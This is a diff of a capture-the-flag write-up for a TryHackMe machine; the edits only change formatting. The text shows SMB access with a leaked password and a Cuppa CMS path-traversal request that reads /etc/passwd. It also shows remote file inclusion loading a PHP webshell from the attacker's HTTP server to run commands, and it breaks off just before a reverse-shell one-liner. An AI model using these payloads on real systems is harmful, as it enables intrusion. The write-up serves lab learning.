@@ -48,7 +48,7 @@ We have changed your smb password after system malfunction.
 Password: )s{A&2Z=F^n_E.B`
 ```
 
-I promptly used this with `smbclient -U milesdyson` to access the restricted share. In there, a level or two deep and buried in a huge set of markdown files I found a text file called important.txt
+I promptly used this with `smbclient -U milesdyson` to access the restricted share. In there, a level or two deep and buried in a huge set of markdown files I found a text file called `important.txt`
 
 Inside this was a list of tasks:
 
@@ -59,7 +59,7 @@ Inside this was a list of tasks:
 3. Spend more time with my wife
 ```
 
-I browsed to that path and found a hidden page on the main site. A `dirb` on the page revealed `/45kra24zxs28v3yd/administrator`, which when browsed to, revealed itself as 'Cuppa CMS'
+I browsed to that path and found a hidden page on the main site. A `dirb` on the page revealed `/45kra24zxs28v3yd/administrator`, which when browsed to, revealed itself as 'Cuppa CMS'.
 
 ## Remote file inclusion and shell
 
@@ -67,9 +67,9 @@ Cuppa is vulnerable to remote file inclusion, even unauthenticated, as described
 
 I tested this with `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` and successfully got the contents of the local `passwd` file, all to the good. 
 
-Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: /home/milesdyson/user.txt. Success! `7ce5c2109a40f958099283600a9ae807`
+Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: `/home/milesdyson/user.txt`. Success! `7ce5c2109a40f958099283600a9ae807`
 
-The exploit would include anything, even a url, so I downloaded a simple request CMD php shell from github, spun up a `python3 -m http.server`, and then tested command execution: `http://10.10.20.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?cmd=whoami&urlConfig=http://10.10.151.47:8000/easy-simple-php-webshell.php` (note the cmd param before the urlConfig). That magic `www-data` showed up.
+The exploit would include anything, even a url, so I downloaded a simple request CMD php shell from github, spun up a `python3 -m http.server`, and then tested command execution: `http://10.10.20.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?cmd=whoami&urlConfig=http://10.10.151.47:8000/easy-simple-php-webshell.php` (note the `cmd` param before the `urlConfig`). That magic `www-data` showed up.
 
 The next step was to get a reverse shell. I like to use this python one liner, when I find `nc -e` doesn't work:
 
